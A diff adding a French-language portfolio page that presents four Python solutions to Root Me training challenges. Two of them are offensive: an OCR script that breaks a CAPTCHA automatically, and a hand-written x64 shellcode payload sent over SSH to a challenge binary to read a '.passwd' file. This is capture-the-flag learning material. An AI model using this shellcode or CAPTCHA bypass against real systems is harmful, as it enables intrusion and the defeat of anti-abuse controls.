@@ -1,0 +1,671 @@
+<!-- Portfolio Modal CC2 -->
+<div class="portfolio-modal modal fade" id="portfolioModalCC2" tabindex="-1" aria-labelledby="portfolioModalCC2Label"
+     aria-hidden="true">
+    <div class="modal-dialog modal-xl">
+        <div class="modal-content">
+            <div class="modal-header border-0">
+                <button class="btn-close" type="button" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body text-center pb-5">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-lg-10">
+                            <!-- Titre -->
+                            <h2 class="portfolio-modal-title text-secondary text-uppercase mb-4">Programmation</h2>
+                            <!-- Icon Divider-->
+                            <div class="divider-custom mb-4">
+                                <div class="divider-custom-line"></div>
+                                <div class="divider-custom-icon"><i class="fa-brands fa-python"></i></div>
+                                <div class="divider-custom-line"></div>
+                            </div>
+
+                            <!-- Introduction -->
+                            <p class="mb-4">
+                                Dans le cadre de mes challenges en programmation sur Root Me, j'ai développé plusieurs
+                                scripts en Python pour résoudre automatiquement des défis variés.
+                                Chaque programme ci-dessous est présenté avec son énoncé, une brève explication, et un
+                                bouton permettant d'afficher le code source dans un style code.
+                            </p>
+
+                            <!-- Accordéon des programmes -->
+                            <div class="accordion mb-4" id="programsAccordion">
+
+                                <!-- Programme 1: CAPTCHA me if you can -->
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header" id="headingOne">
+                                        <button class="accordion-button collapsed text-uppercase" type="button"
+                                                data-bs-toggle="collapse" data-bs-target="#collapseOne"
+                                                aria-expanded="false" aria-controls="collapseOne">
+                                            <span>1. CAPTCHA ME IF YOU CAN <img src="{{ asset('img/rootme.svg') }}" alt="CyberLearning Logo" style="width: 1.5rem; height: auto;" /></span>
+                                        </button>
+                                    </h2>
+                                    <div id="collapseOne" class="accordion-collapse collapse"
+                                         aria-labelledby="headingOne" data-bs-parent="#programsAccordion">
+                                        <div class="accordion-body text-start">
+                                            <strong>Énoncé :</strong> Casser un CAPTCHA dans les 3 secondes pour valider
+                                            le challenge.
+                                            <br><br>
+                                            <strong>Explication :</strong> Ce script récupère un CAPTCHA encodé en
+                                            base64 depuis un serveur, le décode, le pré-traite (traitement d'image, OCR
+                                            avec EasyOCR) puis envoie la réponse correcte en un temps record.
+                                            <br>
+                                            <!-- Bouton pour afficher le code -->
+                                            <button class="btn btn-sm btn-outline-dark mt-3" type="button"
+                                                    data-bs-toggle="collapse" data-bs-target="#codeCaptcha"
+                                                    aria-expanded="false" aria-controls="codeCaptcha">
+                                                Afficher le code
+                                            </button>
+
+                                            <div class="collapse mt-3" id="codeCaptcha">
+                                                <pre><code class="language-python">
+// Code CAPTCHA me if you can :
+import base64
+import numpy as np
+import cv2
+from PIL import Image, ImageEnhance, ImageFilter
+from io import BytesIO
+import easyocr
+import re
+import sys
+import time
+import requests
+from bs4 import BeautifulSoup
+from colorama import Fore, Style, init
+import string
+import os
+import sys
+import contextlib
+
+# Initialisation de colorama
+init(autoreset=True)
+
+# URL de la page du challenge Root Me
+url = 'http://challenge01.root-me.org/programmation/ch8/'
+domain = 'challenge01.root-me.org'
+
+# PHPSESSID récupéré de la session Root Me
+cookies = {'PHPSESSID': 'fb496fb3002d07e0140ee424a521e006'}
+
+# Suppression du message initial de EasyOCR en redirigeant temporairement stdout
+@contextlib.contextmanager
+def suppress_stdout():
+    with open(os.devnull, 'w') as devnull:
+        old_stdout = sys.stdout
+        sys.stdout = devnull
+        try:
+            yield
+        finally:
+            sys.stdout = old_stdout
+
+# Initialiser le lecteur EasyOCR sans afficher les messages de démarrage
+with suppress_stdout():
+    reader = easyocr.Reader(['en'])  # Vous pouvez ajouter d'autres langues si nécessaire
+
+# Dossier pour enregistrer les images prétraitées (facultatif)
+PROCESSED_IMAGES_DIR = 'processed_images'
+if not os.path.exists(PROCESSED_IMAGES_DIR):
+    os.makedirs(PROCESSED_IMAGES_DIR)
+
+def preprocess_image(img):
+    """
+    Fonction pour prétraiter l'image du CAPTCHA.
+    """
+    # Convertir en niveaux de gris
+    img = img.convert('L')
+
+    # Convertir en tableau numpy
+    img_np = np.array(img)
+
+    # Redimensionner l'image pour améliorer la précision de l'OCR
+    img_np = cv2.resize(img_np, None, fx=2, fy=2, interpolation=cv2.INTER_LINEAR)
+
+    # Appliquer un flou gaussien léger pour réduire le bruit
+    img_np = cv2.GaussianBlur(img_np, (3, 3), 0)
+
+    # Binarisation avec seuil Otsu
+    _, img_np = cv2.threshold(img_np, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+
+    # Suppression des petits objets
+    contours, _ = cv2.findContours(img_np, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
+    for cnt in contours:
+        area = cv2.contourArea(cnt)
+        if area < 50:
+            cv2.drawContours(img_np, [cnt], 0, (255, 255, 255), -1)
+
+    # Dilatation légère
+    kernel = np.ones((1, 1), np.uint8)
+    img_np = cv2.dilate(img_np, kernel, iterations=1)
+
+    # Convertir de retour en image PIL
+    img = Image.fromarray(img_np)
+
+    # Augmenter le contraste
+    enhancer = ImageEnhance.Contrast(img)
+    img = enhancer.enhance(2)
+
+    # Appliquer un filtre de netteté
+    img = img.filter(ImageFilter.SHARPEN)
+
+    return img
+
+def save_image(img, iteration):
+    """
+    Fonction pour enregistrer les images prétraitées (pour débogage).
+    """
+    img_path = os.path.join(PROCESSED_IMAGES_DIR, f'captcha_{iteration}.png')
+    img.save(img_path)
+
+def main():
+    print(f"{Fore.CYAN}{Style.BRIGHT}")
+    print("===================================")
+    print("  CAPTCHA Me if You Can - Root Me")
+    print("  Programmation - 20 points")
+    print("")
+    print("  Présenté par br0nson")
+    print("  LinkedIn : t.ly/fra3R ")
+    print("===================================")
+    print("")
+
+    print(f"{Fore.GREEN}Démarrage du script de scraping...{Style.RESET_ALL}")
+    print("")
+
+    session = requests.Session()
+    session.cookies.update(cookies)
+
+    MAX_ATTEMPTS = 100  # Nombre maximal de tentatives
+    attempt = 0
+
+    # Enregistrer le temps de début
+    start_time_total = time.time()
+
+    while attempt < MAX_ATTEMPTS:
+        attempt += 1
+        print(f"{Fore.BLUE}Tentative #{attempt}{Style.RESET_ALL}")
+
+        try:
+            start_time = time.time()
+
+            # Envoyer une requête GET à la page
+            response = session.get(url, timeout=3)
+
+            if response.status_code != 200:
+                # Si la requête échoue, sortir
+                break
+
+            # Parse la réponse pour trouver l'image du CAPTCHA
+            soup = BeautifulSoup(response.text, 'html.parser')
+            img_tag = soup.find('img', src=re.compile('data:image/png;base64'))
+            if not img_tag:
+                # Si aucune image CAPTCHA n'est trouvée, sortir
+                break
+
+            # Récupérer les données base64 de l'image CAPTCHA
+            img_data = img_tag['src'].split(',')[1]
+            img_bytes = base64.b64decode(img_data)
+            img = Image.open(BytesIO(img_bytes))
+
+            # Prétraiter l'image du CAPTCHA
+            processed_img = preprocess_image(img)
+
+            # Enregistrer l'image prétraitée pour inspection (facultatif)
+            save_image(processed_img, attempt)
+
+            # Convertir l'image en format compatible avec EasyOCR (numpy array)
+            img_array = np.array(processed_img)
+
+            # Utiliser EasyOCR pour décoder le CAPTCHA
+            result = reader.readtext(img_array, detail=1, paragraph=False)
+            captcha_text = ''.join([text[1] for text in result if text[2] > 0.5]).strip()
+
+            if captcha_text:
+                # Préparer les données pour le formulaire
+                form_data = {
+                    'cametu': captcha_text
+                }
+
+                # Envoyer la requête POST avec les données du formulaire
+                post_response = session.post(url, data=form_data, timeout=3)
+
+                if post_response.status_code != 200:
+                    continue  # Continuer si la requête POST échoue
+
+                # Vérifier la réponse du serveur
+                soup_post = BeautifulSoup(post_response.text, 'html.parser')
+                text = soup_post.get_text()
+
+                if "Congratz, le flag" in text:
+                    # Extraire le flag avec regex
+                    match = re.search(r'Congratz, le flag(?: est| =) (\w+)', text)
+                    if match:
+                        code = match.group(1)
+                        print(f"{Fore.CYAN}Code obtenu : {code}{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.CYAN}Code non trouvé dans la réponse.{Style.RESET_ALL}")
+                    break  # Sortir de la boucle une fois le code obtenu
+                elif "Raté, retente ta chance" in text:
+                    # Ne pas afficher les messages d'échec
+                    pass
+                else:
+                    # Ne pas afficher les réponses inattendues
+                    pass
+
+            # Vérifier le temps écoulé pour respecter le délai de 3 secondes
+            elapsed_time = time.time() - start_time
+            if elapsed_time < 3:
+                time.sleep(3 - elapsed_time)
+
+        except requests.exceptions.Timeout:
+            # Ignorer les délais d'attente expirés sans afficher de message
+            continue
+        except Exception:
+            # Ignorer les autres exceptions sans afficher de message
+            continue
+
+    # Calculer le temps total écoulé
+    total_elapsed_time = time.time() - start_time_total
+    print(f"{Fore.GREEN}Temps total écoulé : {total_elapsed_time:.2f} secondes{Style.RESET_ALL}")
+
+    if attempt >= MAX_ATTEMPTS:
+        print(f"{Fore.RED}Nombre maximal de tentatives atteint sans succès.{Style.RESET_ALL}")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}Script interrompu par l'utilisateur.{Style.RESET_ALL}")
+        sys.exit(0)
+                                                </code></pre>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Programme 2: ELFx64-Shellcoding - Sheep Warmup -->
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header" id="headingTwo">
+                                        <button class="accordion-button collapsed text-uppercase" type="button"
+                                                data-bs-toggle="collapse" data-bs-target="#collapseTwo"
+                                                aria-expanded="false" aria-controls="collapseTwo">
+                                            <span>2. ELFx64-Shellcoding - Sheep Warmup <img src="{{ asset('img/rootme.svg') }}" alt="Root Me Logo" style="width: 1.5rem; height: auto;" /></span>
+
+                                        </button>
+                                    </h2>
+                                    <div id="collapseTwo" class="accordion-collapse collapse"
+                                         aria-labelledby="headingTwo" data-bs-parent="#programsAccordion">
+                                        <div class="accordion-body text-start">
+                                            <strong>Énoncé :</strong> Fournir un shellcode à un programme (ELF x64)
+                                            modifié par des "moutons", devant exécuter une action spécifique.
+                                            <br><br>
+                                            <strong>Explication :</strong> Le script se connecte à une machine distante
+                                            via SSH, exécute un binaire, injecte un shellcode personnalisé pour afficher
+                                            le contenu d'un fichier sensible. Cela démontre la maîtrise du shellcoding
+                                            et de l'exploitation binaire.
+                                            <br>
+                                            <!-- Bouton pour afficher le code -->
+                                            <button class="btn btn-sm btn-outline-dark mt-3" type="button"
+                                                    data-bs-toggle="collapse" data-bs-target="#codeSheep"
+                                                    aria-expanded="false" aria-controls="codeSheep">
+                                                Afficher le code
+                                            </button>
+
+                                            <div class="collapse mt-3" id="codeSheep">
+                                                <pre><code class="language-python">
+// ELF x64 - Shellcoding - Sheep warmup
+
+#!/usr/bin/env python3
+
+import paramiko
+import time
+import sys
+
+# Informations de connexion
+host = 'challenge01.root-me.org'
+port = 2221
+username = 'programmation-ch12'
+password = 'programmation-ch12'
+
+# Création du shellcode pour lire et afficher le contenu de '.passwd'
+shellcode = (
+    b"\xEB\x07"                    # jmp +7 (saute les bytes écrasés)
+    + b"\x90" * 7                  # 7 NOPs (écrasés par 0xC3)
+    # Le code réel commence ici (offset 9)
+    + b"\x58"                      # pop rax              ; Retirer l'adresse de retour de la pile
+    + b"\x48\x83\xE4\xF0"          # and rsp, 0xfffffffffffffff0 ; Aligner la pile sur 16 octets
+    + b"\x48\x31\xC0"              # xor rax, rax         ; rax = 0
+    + b"\xB0\x02"                  # mov al, 2            ; sys_open
+    + b"\x48\x8D\x3D\x24\x00\x00\x00"  # lea rdi, [rip+0x24] ; Adresse de '.passwd'
+    + b"\x48\x31\xF6"              # xor rsi, rsi         ; rsi = 0 (O_RDONLY)
+    + b"\x0F\x05"                  # syscall              ; Appel système open
+    + b"\x48\x89\xC7"              # mov rdi, rax         ; rdi = fd
+    + b"\x48\x31\xC0"              # xor rax, rax         ; rax = 0
+    + b"\x48\x89\xE6"              # mov rsi, rsp         ; rsi = buffer
+    + b"\xBA\x32\x00\x00\x00"      # mov edx, 50          ; rdx = 50
+    + b"\x0F\x05"                  # syscall              ; Appel système read
+    + b"\x48\x89\xC2"              # mov rdx, rax         ; rdx = nombre de bytes lus
+    + b"\x48\x31\xC0"              # xor rax, rax         ; rax = 0
+    + b"\xB0\x01"                  # mov al, 1            ; sys_write
+    + b"\xBF\x01\x00\x00\x00"      # mov edi, 1           ; rdi = 1 (stdout)
+    + b"\x0F\x05"                  # syscall              ; Appel système write
+    + b".passwd\x00"               # Chaîne '.passwd\0'
+)
+
+# Remplir jusqu'à 80 octets si nécessaire
+payload = shellcode.ljust(80, b'\x90')
+
+try:
+    # Connexion SSH au serveur
+    print("[*] Connexion au serveur...")
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(hostname=host, port=port, username=username, password=password)
+    print("[*] Connecté.")
+
+    # Ouvrir un shell interactif
+    channel = client.invoke_shell()
+    time.sleep(1)  # Attendre que le shell soit prêt
+
+    # Vider le buffer initial
+    while channel.recv_ready():
+        initial_output = channel.recv(1024).decode('utf-8', errors='replace')
+        print(initial_output)
+
+    # Changer de répertoire vers le home
+    print("[*] Changement de répertoire vers le home...")
+    channel.send('cd ~\n')
+    time.sleep(0.5)
+
+    # Exécuter le programme du challenge
+    print("[*] Exécution du programme du challenge...")
+    channel.send('./ch12\n')
+    time.sleep(0.5)
+
+    # Lire la sortie jusqu'à l'invite 'Input shellcode:'
+    output = ''
+    while True:
+        if channel.recv_ready():
+            data = channel.recv(1024).decode('utf-8', errors='replace')
+            output += data
+            print(data, end='')
+            if 'Input shellcode:' in output:
+                break
+        else:
+            time.sleep(0.1)
+
+    # Envoyer le payload
+    print("[*] Envoi du payload...")
+    channel.send(payload + b'\n')
+
+    # Lire la sortie après l'envoi du payload
+    time.sleep(1)
+    output = ''
+    while True:
+        if channel.recv_ready():
+            data = channel.recv(1024)
+            output += data.decode('utf-8', errors='replace')
+        else:
+            break
+
+    # Extraire le mot de passe de la sortie
+    print("[*] Sortie reçue :")
+    print(output)
+
+    # Chercher le mot de passe dans la sortie
+    for line in output.splitlines():
+        if line.strip() and "Erreur de segmentation" not in line:
+            print("[*] Mot de passe trouvé :", line.strip())
+            break
+
+except Exception as e:
+    print(f"Une erreur est survenue : {e}")
+
+finally:
+    if 'channel' in locals() and channel:
+        channel.close()
+    if 'client' in locals() and client:
+        client.close()
+                                                </code></pre>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Programme 3: Solveur de polynômes du second degré -->
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header" id="headingThree">
+                                        <button class="accordion-button collapsed text-uppercase" type="button"
+                                                data-bs-toggle="collapse" data-bs-target="#collapseThree"
+                                                aria-expanded="false" aria-controls="collapseThree">
+                                            <span>3. Solveur de polynômes du second degré <img src="{{ asset('img/rootme.svg') }}" alt="Root Me Logo" style="width: 1.5rem; height: auto;" /></span>
+                                        </button>
+                                    </h2>
+                                    <div id="collapseThree" class="accordion-collapse collapse"
+                                         aria-labelledby="headingThree" data-bs-parent="#programsAccordion">
+                                        <div class="accordion-body text-start">
+                                            <strong>Énoncé :</strong> Se connecter à un serveur TCP, recevoir une
+                                            équation du second degré, la résoudre et renvoyer la solution
+                                            automatiquement.
+                                            <br><br>
+                                            <strong>Explication :</strong> Le script parse l'équation, calcule les
+                                            racines, puis renvoie les solutions au serveur. Il illustre
+                                            l'automatisation, le parsing, le calcul mathématique et la communication
+                                            réseau.
+
+                                            <br>
+                                            <!-- Bouton pour afficher le code -->
+                                            <button class="btn btn-sm btn-outline-dark mt-3" type="button"
+                                                    data-bs-toggle="collapse" data-bs-target="#codePolynomes"
+                                                    aria-expanded="false" aria-controls="codePolynomes">
+                                                Afficher le code
+                                            </button>
+
+                                            <div class="collapse mt-3" id="codePolynomes">
+                                                <pre><code class="language-python">
+// Code Solveur de polynômes du second degré :
+from pwn import *
+import re
+import math
+import time
+
+# Configuration de la connexion
+HOST = 'challenge01.root-me.org'
+PORT = 52018
+
+def parse_equation(equation):
+    # Pattern pour extraire les coefficients et le terme constant
+    coeff_pattern = re.compile(r'([-+]?\d+)\.x²\s*([+-]\s*\d+)\.x¹\s*([+-]\s*\d+)\s*=\s*([-+]?\d+)')
+    match = coeff_pattern.search(equation)
+    if match:
+        a = int(match.group(1))
+        b = int(match.group(2).replace(' ', ''))
+        c = int(match.group(3).replace(' ', ''))
+        rhs = int(match.group(4).replace(' ', ''))
+        # Ajuster c en soustrayant le côté droit de l'équation
+        c = c - rhs
+        return a, b, c
+    else:
+        return None
+
+def solve_quadratic(a, b, c):
+    discriminant = b**2 - 4*a*c
+    if discriminant > 0:
+        sqrt_disc = math.sqrt(discriminant)
+        root1 = (-b + sqrt_disc) / (2*a)
+        root2 = (-b - sqrt_disc) / (2*a)
+        root1 = round(root1, 3)
+        root2 = round(root2, 3)
+        # Formater les racines avec trois décimales
+        roots = sorted([root1, root2])  # Trier les racines pour la cohérence
+        root1_str = f"{roots[0]:.3f}"
+        root2_str = f"{roots[1]:.3f}"
+        return f"x1: {root1_str} ; x2: {root2_str}"
+    elif discriminant == 0:
+        root = -b / (2*a)
+        root = round(root, 3)
+        root_str = f"{root:.3f}"
+        return f"x: {root_str}"
+    else:
+        return "Not possible"
+
+# Fonction pour gérer la connexion et résoudre les équations
+def main():
+    start_time = time.time()  # Démarrer le chronomètre
+
+    while True:
+        try:
+            # Initialiser la connexion
+            conn = remote(HOST, PORT)
+
+            while True:
+                # Lire la sortie du serveur
+                server_response = conn.recvline().decode().strip()
+                # On n'affiche pas les messages du serveur pour réduire le bruit
+
+                # Rechercher une équation à résoudre
+                equation_pattern = re.compile(r'Solve this equation please: (.*)')
+                match = equation_pattern.search(server_response)
+                if match:
+                    equation = match.group(1)
+
+                    # Extraire les coefficients
+                    coeffs = parse_equation(equation)
+                    if coeffs:
+                        a, b, c = coeffs
+                        # Afficher l'équation résolue avec les coefficients
+                        print(f"Équation : {equation}")
+                        print(f"Coefficients : a={a}, b={b}, c={c}")
+
+                        # Résoudre l'équation
+                        result = solve_quadratic(a, b, c)
+
+                        # Envoyer le résultat au serveur
+                        conn.sendline(result.encode())
+
+                        # Afficher la réponse envoyée au serveur
+                        print(f"Envoyé : {result}")
+                    else:
+                        # Impossible d'analyser l'équation
+                        pass
+
+                else:
+                    # Vérifier si le flag est présent
+                    if "[+] Good job !" in server_response:
+                        # Extraire le flag de la réponse du serveur
+                        flag_index = server_response.find("flag: ")
+                        if flag_index != -1:
+                            flag = server_response[flag_index + len("flag: "):]
+                            # Afficher la réponse du serveur contenant le flag
+                            print(f"Réponse du serveur contenant le flag : {server_response}")
+                            # Afficher le temps écoulé
+                            elapsed_time = time.time() - start_time
+                            print(f"Temps total écoulé : {elapsed_time:.3f} secondes")
+                            conn.close()
+                            return  # Terminer le script après avoir obtenu le flag
+                        else:
+                            # Si "flag: " n'est pas trouvé, continuer
+                            pass
+
+                    elif "[!]" in server_response:
+                        # Réponse incorrecte, le serveur a fermé la connexion
+                        conn.close()
+                        break  # Sortir de la boucle pour se reconnecter
+                    else:
+                        # Autres messages du serveur
+                        pass  # Ignorer ou traiter si nécessaire
+
+        except EOFError:
+            # Fin de la connexion avec le serveur
+            break
+        except Exception as e:
+            # Gérer les autres exceptions si nécessaire
+            break
+
+if __name__ == "__main__":
+    main()
+                                                </code></pre>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Programme 4: TCP uncompress me -->
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header" id="headingFour">
+                                        <button class="accordion-button collapsed text-uppercase" type="button"
+                                                data-bs-toggle="collapse" data-bs-target="#collapseFour"
+                                                aria-expanded="false" aria-controls="collapseFour">
+
+                                            <span>4. TCP uncompress me <img src="{{ asset('img/rootme.svg') }}" alt="Root Me Logo" style="width: 1.5rem; height: auto;" /></span>
+                                        </button>
+                                    </h2>
+                                    <div id="collapseFour" class="accordion-collapse collapse"
+                                         aria-labelledby="headingFour" data-bs-parent="#programsAccordion">
+                                        <div class="accordion-body text-start">
+                                            <strong>Énoncé :</strong> Se connecter en TCP, recevoir une chaîne
+                                            base64+zlib, la décoder, la décompresser et la renvoyer, le tout en moins de
+                                            2 secondes.
+                                            <br><br>
+                                            <strong>Explication :</strong> Le programme démontre la capacité à gérer des
+                                            formats d'encodage et de compression, à interagir en TCP dans un temps
+                                            limité, et à renvoyer la réponse correcte avant expiration.
+
+                                            <br>
+                                            <!-- Bouton pour afficher le code -->
+                                            <button class="btn btn-sm btn-outline-dark mt-3" type="button"
+                                                    data-bs-toggle="collapse" data-bs-target="#codeTcpUncompress"
+                                                    aria-expanded="false" aria-controls="codeTcpUncompress">
+                                                Afficher le code
+                                            </button>
+
+                                            <div class="collapse mt-3" id="codeTcpUncompress">
+                                                <pre><code class="language-python">
+// Code TCP uncompress me :
+import socket
+import re
+import base64
+import zlib
+
+HOST = "challenge01.root-me.org"  # address (localhost)
+PORT = 52022  # Port
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    print("Connected to server.")
+    for i in range(4):
+        # Receive data
+        data = s.recv(1024)
+        rot13 = data.decode("utf-8")
+        print(f"Received data :{rot13}")
+
+        encrypted = re.findall(r"'(.*?)'", rot13)
+
+        # base64 decryption
+        decrypted = base64.b64decode(encrypted[0])
+        # zlib decompression
+        decompressed = zlib.decompress(decrypted).decode('utf-8')
+
+        s.sendall((decompressed + '\n').encode("utf-8"))
+        print(f"Result sent to Server: {decompressed}")
+
+    response = s.recv(1024)
+    print(f"Server response: {response.decode("utf-8")}")
+                                                </code></pre>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div><!-- Fin de l'accordion -->
+
+                            <!-- Bouton de Fermeture -->
+                            <button class="btn btn-custom" data-bs-dismiss="modal">
+                                <i class="fas fa-xmark fa-fw me-2"></i> Fermer la Fenêtre
+                            </button>
+
+                        </div><!-- col-lg-10 -->
+                    </div><!-- row -->
+                </div><!-- container -->
+            </div><!-- modal-body -->
+        </div><!-- modal-content -->
+    </div><!-- modal-dialog -->
+</div><!-- modal fade -->
+
+
